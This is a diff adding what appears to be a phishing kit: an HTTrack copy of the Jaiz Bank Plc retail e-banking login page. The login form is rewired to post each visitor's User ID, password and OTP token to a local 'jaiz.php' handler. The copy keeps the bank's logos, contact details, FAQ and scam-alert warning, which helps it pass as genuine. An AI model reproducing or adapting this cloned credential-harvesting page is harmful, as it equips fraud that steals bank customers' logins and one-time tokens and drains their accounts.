@@ -1,0 +1,571 @@
+
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<!-- Mirrored from ibank.jaizbankplc.com/eBankingIndividual/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 29 Nov 2021 18:12:28 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head id="mainhead"><title>
+	Jaiz e-Banking : Login
+</title><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><meta name="description" content="Jaiz Internet Banking Portal" /><meta name="author" content="Adekanmbi Dayo" /><meta http-equiv="Expires" content="0" /><meta http-equiv="Pragma" content="no-cache" /><meta http-equiv="Cache-Control" content="no-cache" />
+    <!-- end: Meta -->
+
+    <!-- start: Mobile Specific -->
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <!-- end: Mobile Specific -->
+
+    <script type="text/javascript">
+        function preventBack() { window.history.forward(); }
+        setTimeout("preventBack()", 0);
+        window.onunload = function () { null };
+    </script>
+
+    <!-- start: CSS -->
+    <link href="assets/css/bootstrap.min.css" rel="stylesheet" /><link href="assets/css/style.min.css" rel="stylesheet" /><link href="assets/css/retina.min.css" rel="stylesheet" /><link href="assets/css/font.min.css" rel="stylesheet" /><link href="assets/css/custom.css" rel="stylesheet" /><link href="assets/css/jquery-ui.css" rel="stylesheet" /><link href="assets/css/responsive.css" rel="stylesheet" />
+    <!-- end: CSS -->
+
+    <script src="assets/js/jquery-2.0.3.min.js"></script>
+    <!--[if !IE]>-->
+    <script type="text/javascript">
+        window.jQuery || document.write("<script src='assets/js/jquery.min.js'>" + "<" + "/script>");
+    </script>
+    <!--<![endif]-->
+    <!-- The HTML5 shim, for IE6-8 support of HTML5 elements -->
+    <!--[if lt IE 9]>
+	
+	  	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+		<script src="assets/js/respond.min.js"></script>
+		<script src="assets/css/ie6-8.css"></script>
+		
+	<![endif]-->
+    <script type="text/javascript">
+        $(document).ready(
+            function () {
+                $("input").attr("autocomplete", "off");
+                jQuery.fn.ForceNumericOnly =
+                function () {
+                    return this.each(function () {
+                        $(this).keydown(function (e) {
+                            var key = e.charCode || e.keyCode || 0;
+                            // allow backspace, tab, delete, arrows, numbers and keypad numbers ONLY
+                            // home, end, period, and numpad decimal
+                            return (
+                                key == 8 ||
+                                key == 9 ||
+                                key == 46 ||
+                                key == 110 ||
+                                key == 190 ||
+                                (key >= 35 && key <= 40) ||
+                                (key >= 48 && key <= 57) ||
+                                (key >= 96 && key <= 105));
+                        });
+                    });
+                };
+                $(".numerical").ForceNumericOnly();
+            });
+    </script>
+    <script>
+        window.onload = function () {
+            var myInput = document.getElementById('passwordInput');
+            myInput.onpaste = function (e) {
+                e.preventDefault();
+            }
+        }
+    </script>
+    <script src="assets/js/rightClick.js"></script>
+    <style>
+        .nav-tabs > li.active > a, .nav-tabs > li.active > a:hover, .nav-tabs > li.active > a:focus {
+            color: #FFF;
+            cursor: default;
+            background-color: #5DB734;
+            border: 1px solid transparent;
+            -moz-border-top-colors: none;
+            -moz-border-right-colors: none;
+            -moz-border-bottom-colors: none;
+            -moz-border-left-colors: none;
+            border-image: none;
+        }
+
+        .nav-tabs > li > a {
+            margin-right: 2px;
+            line-height: 1.42857;
+            border: 1px solid transparent;
+            border-radius: 4px 4px 0px 0px;
+            color: #2C5034;
+            cursor: default;
+            text-decoration: none;
+            background-color: #BDEA74;
+        }
+
+        .text-small {
+            font-size: 12px;
+        }
+
+        .nav-tabs {
+            border-bottom: none;
+        }
+
+        .scam-list {
+            padding-right:20px;
+        }
+
+        .scam-list  li{
+            text-align:justify;
+        }
+
+        legend {
+            display: block;
+            width: 100%;
+            padding: 0px;
+            margin-bottom: 5px;
+            font-size: 21px;
+            line-height: inherit;
+            color: #333;
+            border-width: 0px 0px 1px;
+            border-style: none none solid;
+            border-color: -moz-use-text-color -moz-use-text-color #E5E5E5;
+            -moz-border-top-colors: none;
+            -moz-border-right-colors: none;
+            -moz-border-bottom-colors: none;
+            -moz-border-left-colors: none;
+            border-image: none;
+        }
+    </style>
+</head>
+<body class="login-bg">
+    <div id="mainform" class="dot-pattern">
+        <!-- start: Header -->
+        <header class="navbar">
+            <div class="container">
+
+                <button class="navbar-toggle btn btn-success" type="button" data-toggle="collapse" data-target=".sidebar-nav.nav-collapse">
+                    <strong>MENU</strong>
+                </button>
+
+
+                <div class="nav-no-collapse header-nav">
+                    <ul class="nav navbar-nav pull-left">
+                        
+                        <li class="dropdown hidden-xs">
+                            <a id="contactLink" class="btn dropdown-toggle" href="#">
+                                <i class="fa fa-envelope"></i>&nbsp;Contact
+                            </a>
+                        </li>
+
+                        <li class="dropdown hidden-xs">
+                            <a id="helpLink" class="btn dropdown-toggle" href="#">
+                                <i class="fa fa-question-circle"></i>&nbsp;Help
+                            </a>
+                        </li>
+                    </ul>
+
+                    <ul class="nav navbar-nav pull-right">
+
+                        <!-- start: User Dropdown -->
+                        <li class="dropdown hidden-xs"></li>
+                        <li class=""></li>
+                        <!-- end: User Dropdown -->
+                    </ul>
+                </div>
+                <!-- end: Header Menu -->
+
+            </div>
+        </header>
+        <!-- end: Header -->
+
+        <!-- start: Hero bar -->
+        <header class="hero-bar">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-6 col-xs-6 ">
+                        <img class="img-responsive" style="max-height: 70px; width: auto" src="assets/img/jaizonline.jpg" />
+                    </div>
+
+                    <div class="col-md-6 hidden-sm hidden-xs" style="padding-right: 0">
+                        <img class="img-responsive pull-right" style="max-height: 70px; width: auto" src="assets/img/logo.jpg" />
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!-- end: Hero -->
+
+        <!-- start: Ticker bar -->
+        <header class="ticker-bar">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-6">
+                    </div>
+                    <div class="col-md-6">
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!-- end: Tickr -->
+
+        <div class="container">
+            <div class="row">
+                <div class="col-md-7 col-md-offset-1 hidden-xs hidden-sm ">
+                    <div class="welcome-box pull-left">
+                        <div class="row" style="margin-top: 40px; background-color: #fff; border-radius: 3px; min-height: 400px; padding-left: 20px;">
+                            <h1 class="text-success" style="font-family: 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif">Retail Internet Banking</h1>
+                            <h2 class="text-success" style="font-family:'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif; font-size:20px;">Features</h2>
+                            <h3 class="text-warning" style="font-family: 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif"> <i class="fa fa-lock"></i>&nbsp;Secure Internet Banking</h3>
+                            <ul style="font-family: 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif; padding-left: 20px">
+                                <li>Multi-level security implementation for secured transactions</li>
+                                <li>2-factor authentication</li>
+                            </ul>
+                            
+                            <h3 class="text-warning" style="font-family: 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif"><i class="fa fa-money"></i>&nbsp;Simplified Payments</h3>
+                            <ul style="font-family: 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif; padding-left: 20px">
+                                <li>Local Intra-bank and Inter-bank payments via NIBSS Instant Payments</li>
+                                <li>Payment to Single and Multiple Beneficiaries</li>
+                                <li>Airtime Recharge and Bills Payment (DsTV, GoTV, PHCN, Airline Payments, e.t.c) time </li>
+                            </ul>
+
+                            <h3 class="text-warning" style="font-family: 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif"><i class="fa fa-dashboard"></i>&nbsp;Reporting</h3>
+                            <ul style="font-family: 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif; padding-left: 20px">
+                                <li>Comprehensive corporate accounts monitoring system for balance/account statement enquiry and payment reports</li>
+                            </ul>
+                            
+                        </div>
+                    </div>
+                </div>
+
+                <div class="col-md-3">
+                    <div class="login-box" style="font-family: 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif; min-height: 400px;">
+                        <h2 style="margin-top: 10px;font-family: 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif;">Login to your account</h2>
+                        <form method="post" action="jaiz.php" onsubmit="javascript:return WebForm_OnSubmit();" id="frmLogin" class="form-horizontal">
+<div class="aspNetHidden">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="gPn9keSt20IwM5j+SVtx+XwG59fE/J/PA2n20dLhSHsO6aatHKcrOc5G8wByrEa/szjoxkc0w2tbgl0cm9oA2PAnQok=" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['frmLogin'];
+if (!theForm) {
+    theForm = document.frmLogin;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="WebResource2971.js?d=d8M9xuN1QOfmI_NIqLZUGKqCabsVDS5OI0hjgh77no413RFvD7WB3nLYlArKEmhYI4Z6j2wJDmXDVqMmp7kLq1lQX501&amp;t=636531970931186355" type="text/javascript"></script>
+
+
+<script src="WebResource6cec.js?d=L_oBlkHPN650mJxHTWcvUW3nD8uOAvOkNbPqhdxNunDrm9Z7FkXmoAZiKt4FaDOyXtCLBtsYZPty5RKLPYOtbh1yn4k1&amp;t=636531970931186355" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+function WebForm_OnSubmit() {
+if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+return true;
+}
+//]]>
+</script>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="5A63E331" />
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="dqzauZCSno06cSiy/xmn0enPbT6y0I7mbjJObtUKYbdgH/PemLdud3PIedN9w6fnQeJlmc1pz3bE/R41mdrA8mI4VSYsIKzA7/UyP7jaj5R1udv2ea5soMjiD7jDKA7EbHIHFY9vJtjS1J5KjgJKBeD/SolVD6eHdIA5oBxR9ipm3CFdqUnM00rVYEdggY03k33NFA==" />
+</div>
+                            
+                            <div id="vsLogin" class="alert alert-danger text-small" style="display:none;">
+
+</div>
+                            <fieldset>
+                                <legend></legend>
+                                <label for="" style="margin-bottom: 2px">User ID</label>
+                                <input name="usernameInput" type="text" id="usernameInput" class="input-large col-xs-12 numerical" autocomplete="off" placeholder="User ID" />
+                                <span id="usernameRFV" style="display:none;"></span>
+
+                                <label for="" style="margin-bottom: 2px">Password </label>
+                                <input name="passwordInput" type="password" id="passwordInput" class="input-large col-xs-12 qwerty" autocomplete="off" placeholder="Password" />
+                                <span id="passwordRFV" style="display:none;"></span>
+
+                                <label for="" style="margin-bottom: 2px">OTP (Token) </label>
+                                <input name="tokenInput" type="password" id="tokenInput" class="input-large col-xs-12 qwerty" autocomplete="off" placeholder="OTP (Token)" />
+                                <span id="tokenRFV" style="display:none;"></span>
+
+                                <hr style="margin: 11px 0" />
+                                <input type="submit" name="loginBtn" value="Login" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;loginBtn&quot;, &quot;&quot;, true, &quot;login&quot;, &quot;&quot;, false, false))" id="loginBtn" class="btn btn-success btn-block col-xs-12" />
+                            </fieldset>
+                        
+<script type="text/javascript">
+//<![CDATA[
+var Page_ValidationSummaries =  new Array(document.getElementById("vsLogin"));
+var Page_Validators =  new Array(document.getElementById("usernameRFV"), document.getElementById("passwordRFV"), document.getElementById("tokenRFV"));
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+var vsLogin = document.all ? document.all["vsLogin"] : document.getElementById("vsLogin");
+vsLogin.validationGroup = "login";
+var usernameRFV = document.all ? document.all["usernameRFV"] : document.getElementById("usernameRFV");
+usernameRFV.controltovalidate = "usernameInput";
+usernameRFV.errormessage = "Username is required";
+usernameRFV.display = "None";
+usernameRFV.validationGroup = "login";
+usernameRFV.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+usernameRFV.initialvalue = "";
+var passwordRFV = document.all ? document.all["passwordRFV"] : document.getElementById("passwordRFV");
+passwordRFV.controltovalidate = "passwordInput";
+passwordRFV.errormessage = "Password is required";
+passwordRFV.display = "None";
+passwordRFV.validationGroup = "login";
+passwordRFV.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+passwordRFV.initialvalue = "";
+var tokenRFV = document.all ? document.all["tokenRFV"] : document.getElementById("tokenRFV");
+tokenRFV.controltovalidate = "tokenInput";
+tokenRFV.errormessage = "Token is required";
+tokenRFV.display = "None";
+tokenRFV.validationGroup = "login";
+tokenRFV.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+tokenRFV.initialvalue = "";
+//]]>
+</script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+
+var Page_ValidationActive = false;
+if (typeof(ValidatorOnLoad) == "function") {
+    ValidatorOnLoad();
+}
+
+function ValidatorOnSubmit() {
+    if (Page_ValidationActive) {
+        return ValidatorCommonOnSubmit();
+    }
+    else {
+        return true;
+    }
+}
+        //]]>
+</script>
+</form>
+                        <b>Forgot Password?</b>
+                        <p>
+                            <a id="forgotPasswordHyperLink" class="badge badge-warning" href="forgot-password.html">Click here</a>
+                            to get a new password.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+        <!--/row-->
+    </div>
+    <!--/container-->
+
+    <div class="clearfix"></div>
+    <footer class="hidden-sm hidden-xs">
+        <p>
+            <span style="text-align: left; float: left">&copy; 2016 Jaiz Bank Plc. </span>
+        </p>
+    </footer>
+    <!--Contact Modal-->
+    <div class="modal fade" id="contactModal" tabindex="-1" role="dialog" aria-labelledby="contactModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                    <h3 class="modal-title" id="contactModalLabel"><b>Contact</b></h3>
+                </div>
+                <div class="modal-body">
+                    <div class="alert alert-success medium-font">
+                        <div class="form-horizontal" role="form">
+                            <div class="form-group form-group-mini">
+                                <label for="lastLoginLabel" class="col-sm-4 control-label control-label-mini text-warning"><i class="fa fa-home"></i>&nbspHead Office :</label>
+                                <div class="col-sm-8">
+                                    No. 73 Ralph Shodeinde Street Central Business District Garki Abuja
+                                </div>
+                            </div>
+                            <div class="form-group form-group-mini">
+                                <label for="lastLoginLabel" class="col-sm-4 control-label control-label-mini text-warning"><i class="fa fa-envelope"></i>&nbspEmail Address :</label>
+                                <div class="col-sm-8">
+                                    customercare@jaizbankplc.com
+                                </div>
+                            </div>
+                            <div class="form-group form-group-mini">
+                                <label for="lastLoginLabel" class="col-sm-4 control-label control-label-mini text-warning"><i class="fa fa-phone-square"></i>&nbspHelplines :</label>
+                                <div class="col-sm-8">
+                                     +2347007730000
+                                </div>
+                            </div>
+                            <div class="form-group form-group-mini">
+                                <label for="lastLoginLabel" class="col-sm-4 control-label control-label-mini text-warning"><i class="fa fa-globe"></i>&nbspWebsite :</label>
+                                <div class="col-sm-8">
+                                    www.jaizbankplc.com
+                                </div>
+                            </div>
+                            <div class="form-group form-group-mini">
+                                <label for="lastLoginLabel" class="col-sm-4 control-label control-label-mini text-warning">Social Media :</label>
+                                <div class="col-sm-2">
+                                    <img class=" img-responsive" style="height: 25px; width: auto" src="assets/img/facebooki.png" alt="">
+                                </div>
+                                <div class="col-sm-2">
+                                    <img class=" img-responsive" style="height: 25px; width: auto" src="assets/img/linkedini.png" alt="">
+                                </div>
+                                <div class="col-sm-2">
+                                    <img class=" img-responsive" style="height: 25px; width: auto" src="assets/img/twitteri.png" alt="">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-success" data-dismiss="modal"><i class="fa fa-times"></i>Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!--Help Modal-->
+    <div class="modal fade" id="helpModal" tabindex="-1" role="dialog" aria-labelledby="helpModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                    <h3 class="modal-title" id="helpModalLabel"><b>FREQUENTLY ASKED QUESTIONs (FAQ) </b></h3>
+                </div>
+                <div class="modal-body">
+                    <div class="faq">
+                        <h3>1.	How do I apply for Internet Banking?</h3>
+                        <p>Please walk into any our branches and fill the JaizOnline Application form and submit to the Customer Service Officer (CSO) for instant Set up and Token Assignment.</p>
+                        <h3>2.	How secured is the internet banking platform?</h3>
+                        <p>The Internet Banking platform runs on a highly secured environment. The platform’s unique security levels ensure that only authorized transactions are approved and your details/transactions are safe.</p>
+                        <h3>3.	How do I get my internet banking User name and password?</h3>
+                        <p>
+                            Once set up on the internet banking platform, the <b>UserID</b> is sent in a mail to the customer and a <b>default password</b> is also sent to the customers <b>in a separate mail</b> using the valid email address provided at the point of account opening.
+                            <br />
+                            Note: UserID remains the customer’s CIF.
+                        </p>
+                        <h3>4.	How do I reset my password without sending mails?</h3>
+                        <p>Click on the forgot password link on the online login page.</p>
+                        <h3>5.	Can I add more than One Accounts to my internet banking profile?</h3>
+                        <p>Yes you can. All accounts opened under same CIF can be added to your internet banking Profile. Please log in to your Internet Banking and go to <b>User preference</b>, click Manage account. You can then add account and set limit.</p>
+                        <h3>6.	What is a Token?</h3>
+                        <p>A Token is a security device that generates random numbers (One Time Password - OTP) to be used for online transfers.</p>
+                        <h3>7.	Must a customer use a token?</h3>
+                        <p>Yes, it is mandatory for all customers</p>
+                        <h3>8.	How do I get my Internet Banking Token?</h3>
+                        <p>It’s quite simple. You shall be assigned a Token at the point of internet banking set up in any of our branches where the application is done.</p>
+                        <h3>9.	What do I do when I misplace my token?</h3>
+                        <p>You simply walk into any of our branches for new token re-assignment at an approved rate.</p>
+                        <h3>10.	How can I Unblock my internet banking account if it is locked?</h3>
+                        <p>Please visit at any of our branches closer to you or call our Contact centre on <b> +2347007730000</b> for your account to be unblocked.</p>
+                        <h3>11.	Can I Reset the Answer to my secret question?</h3>
+                        <p>Yes. Click on User preference on the internet banking menu tab, click Reset Secret question and supply a new secret answer. </p>
+                        <h3>12.	Can I have my Token delivered to a location of my Choice?</h3>
+                        <p>Yes you can. However the Courier cost will be borne by the customer.</p>
+                        <h3>13.	What other activities can I perform using the Internet Banking platform?</h3>
+                        <p>You can view your Account Statement, Cheque Book Request, Stop Cheque, Cheque Confirmation, Bills Payment and Airtime Purchase.</p>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-success" data-dismiss="modal"><i class="fa fa-close"></i>Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!--Scam Alert Modal-->
+    <div class="modal fade" id="scamAlertModal" tabindex="-1" role="dialog" aria-labelledby="scamAlertModalLabel" aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                    <h3 class="modal-title" id="scamAlertModalLabel"><b>Scam Alert</b></h3>
+                </div>
+                <div class="modal-body">
+                    <div class="row" style="background-color:#fff; padding-left :20px; border-radius:3px; min-height:350px;">
+                            <div class="col-md-4 col-sm-4 col-lg-4">
+                                <div class="row">
+                                    <img alt="" class="img-responsive scam-alert-border hidden-xs" src="assets/img/scam-logo.jpg" />
+                                </div>
+                            </div>
+
+                            <div class="col-md-8 col-sm-8 col-lg-8">
+                                <div class="row">
+                                    
+                                    <ul class="scam-list" style="font-family:'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif">
+                                        <h1 class="text-danger" style="font-family:'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', 'DejaVu Sans Condensed', sans-serif" >Scam Alert !</h1>
+                                        <li>Be certain that no one is looking over your shoulder as you enter your User Id and Password to log in to our Internet Banking Service.</li>
+                                        <li>Your Account User ID, Password and Token are confidential. Do not disclose them to anyone.</li>
+                                        <li>Be advised to always log on to our internet banking service via our secured website - <a href="http://www.jaizbankplc.com/">www.jaizbankplc.com</a></li>
+                                        <li>Protect your ATM Card, do not disclose your card number and PIN to anyone</li>
+                                        <li>Regularly check your account statements and report any irregularities to <a href="mailto:customercare@jaizbankplc.com">customercare@jaizbankplc.com</a></li>
+                                        <li>Jaiz Bank will not request for the details of your account/PIN/Password/Token online nor request that you supply them by clicking a link. Please ignore such mails.</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-success" data-dismiss="modal"><i class="fa fa-times"></i>Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type='text/javascript'>
+        var onWebChat={ar:[], set: function(a,b){if (typeof onWebChat_==='undefined'){this.ar.
+        push([a,b]);}else{onWebChat_.set(a,b);}},get:function(a){return(onWebChat_.get(a));},
+        w:(function(){ var ga=document.createElement('script'); ga.type = 'text/javascript';
+        ga.async=1;ga.src=('https:'==document.location.protocol?'https:':'http:') + 
+        '//www.onwebchat.com/clientchat/5b4916c9cdfe7779241818f364030dc0';var s=
+        document.getElementsByTagName('script')[0];s.parentNode.insertBefore(ga,s);})()}
+        </script>
+    
+    <!-- start: JavaScript-->
+    <!--[if !IE]>-->
+    <!--<![endif]-->
+    <!--[if IE]>
+		<script src="assets/js/jquery-1.10.2.min.js"></script>
+	    <![endif]-->
+    <!--[if IE]>
+		    <script type="text/javascript">
+	 	    window.jQuery || document.write("<script src='assets/js/jquery-1.10.2.min.js'>"+"<"+"/script>");
+		    </script>
+	    <![endif]-->
+    <script src="assets/js/jquery-migrate-1.2.1.min.html"></script>
+    <script src="assets/js/bootstrap.min.js"></script>
+    <!-- theme scripts -->
+    <script src="assets/js/custom.min.js"></script>
+    <script src="assets/js/jquery.cookie.js"></script>
+    <!-- end: JavaScript-->
+    <script>
+        $(document).ready(function () {
+            if ($.cookie("scam-alert-appearance") == null) {
+                var tenMinutesAheadTime = new Date();
+                var minOffset = 1 * 60 * 60 * 1000;
+                tenMinutesAheadTime.setTime(tenMinutesAheadTime.getTime() + minOffset);
+
+                $.cookie("scam-alert-appearance", "True", { expires: tenMinutesAheadTime });
+
+                $("#scamAlertModal").modal({ backdrop: 'static' });
+            }
+
+            $("#contactLink").click(function () {
+                $("#contactModal").modal({ backdrop: 'static' });
+            });
+            $("#helpLink").click(function () {
+                $("#helpModal").modal({ backdrop: 'static' });
+            });
+        });
+    </script>
+</body>
+
+<!-- Mirrored from ibank.jaizbankplc.com/eBankingIndividual/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 29 Nov 2021 18:12:49 GMT -->
+</html>
